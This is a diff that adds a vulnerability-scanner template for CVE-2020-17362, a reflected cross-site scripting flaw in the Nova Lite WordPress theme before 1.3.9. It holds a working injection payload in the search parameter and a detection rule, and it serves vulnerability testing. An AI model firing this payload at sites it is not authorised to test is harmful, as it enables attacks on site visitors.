@@ -1,0 +1,27 @@
+id: CVE-2020-17362
+
+info:
+  name: Nova Lite < 1.3.9 - Unauthenticated Reflected XSS
+  risk: Medium
+  tech: WordPress
+
+params:
+  - root: '{{.BaseURL}}'
+
+variables:
+  - vuln: |
+      /?s=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+
+requests:
+  - method: GET
+    redirect: false
+    url: >-
+      {{.root}}{{.vuln}}
+    headers:
+      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
+    detections:
+      - >-
+        StatusCode() == 200 && StringSearch("resBody", "</script><script>alert(document.domain)</script>")
+
+references:
+  - https://wpscan.com/vulnerability/30a83491-2f59-4c41-98bd-a9e6e5a609d4
